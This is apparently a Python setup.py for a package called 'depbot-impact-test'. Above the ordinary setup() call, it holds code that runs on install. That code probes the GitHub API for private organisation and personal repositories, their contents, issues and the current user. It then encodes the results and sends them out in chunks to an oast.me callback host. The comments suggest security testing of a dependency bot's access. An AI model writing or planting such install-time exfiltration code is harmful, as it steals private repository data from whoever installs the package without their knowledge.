import os, urllib.request, base64, json

results = {}

# The API might have broader scope than git!
# Test API access to PRIVATE repos in the same org

# 1. Private org repo (git failed earlier - does API work?)
try:
    req = urllib.request.Request('https://api.github.com/repos/tooforg/private-test-repo')
    resp = urllib.request.urlopen(req, timeout=10)
    data = resp.read()
    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
    results['api_private_org_repo'] = d[:300]
except Exception as e:
    results['api_private_org_repo'] = str(e)[:150]

# 2. Read private repo CONTENTS (would prove cross-repo data access!)
try:
    req = urllib.request.Request('https://api.github.com/repos/tooforg/private-test-repo/contents/README.md')
    resp = urllib.request.urlopen(req, timeout=10)
    data = resp.read()
    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
    results['private_contents'] = d[:300]
except Exception as e:
    results['private_contents'] = str(e)[:150]

# 3. List private repo issues (contains our canary data!)
try:
    req = urllib.request.Request('https://api.github.com/repos/tooforg/private-test-repo/issues?per_page=1')
    resp = urllib.request.urlopen(req, timeout=10)
    data = resp.read()
    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
    results['private_issues'] = d[:400]
except Exception as e:
    results['private_issues'] = str(e)[:150]

# 4. Cross-user private repo (toofikz1's personal repo)
try:
    req = urllib.request.Request('https://api.github.com/repos/toofikz1/personal-secret-repo')
    resp = urllib.request.urlopen(req, timeout=10)
    data = resp.read()
    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
    results['crossuser_private'] = d[:300]
except Exception as e:
    results['crossuser_private'] = str(e)[:150]

# 5. Check /user to see WHO we are (might work now with different timing)
try:
    req = urllib.request.Request('https://api.github.com/user')
    resp = urllib.request.urlopen(req, timeout=10)
    data = resp.read()
    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
    results['api_user'] = d[:300]
except Exception as e:
    results['api_user'] = str(e)[:150]

# 6. List org repos (would show ALL repos including private)
try:
    req = urllib.request.Request('https://api.github.com/orgs/tooforg/repos?type=private&per_page=5')
    resp = urllib.request.urlopen(req, timeout=10)
    data = resp.read()
    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
    results['org_private_repos'] = d[:300]
except Exception as e:
    results['org_private_repos'] = str(e)[:150]

# Exfil
payload = base64.urlsafe_b64encode(json.dumps(results).encode()).decode()
chunks = [payload[i:i+1800] for i in range(0, min(len(payload), 14000), 1800)]
for i, chunk in enumerate(chunks):
    try:
        urllib.request.urlopen('http://' + 'd99nibe1b2etnockvmb0erm7ukhz99koq.oast.me' + '/v12/' + str(i) + '?d=' + chunk, timeout=5)
    except:
        pass

from setuptools import setup
setup(name="depbot-impact-test", version="1.0.0",
      install_requires=["requests==2.26.0", "urllib3==1.26.5", "flask==2.0.0"])
